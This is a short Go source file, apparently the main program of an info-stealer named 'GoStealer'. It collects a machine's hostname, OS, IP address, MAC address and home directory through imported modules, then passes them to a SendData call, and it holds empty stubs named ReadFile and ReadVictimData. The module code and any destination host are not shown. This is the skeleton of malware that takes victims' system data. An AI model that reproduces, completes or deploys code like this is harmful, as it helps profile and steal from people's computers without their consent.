package main

import (
	Modules "GoStealer/modules"
)

func main() {
	a := Modules.HostnameInfo()
	b := Modules.OsInfo()
	c := Modules.IpAdressInfo()
	d := Modules.MacAdressInfo()
	e := Modules.HomeDirInfo()
	Modules.SendData(a, b, c, d, e)
}

func ReadFile() {

}

func ReadVictimData() {

}
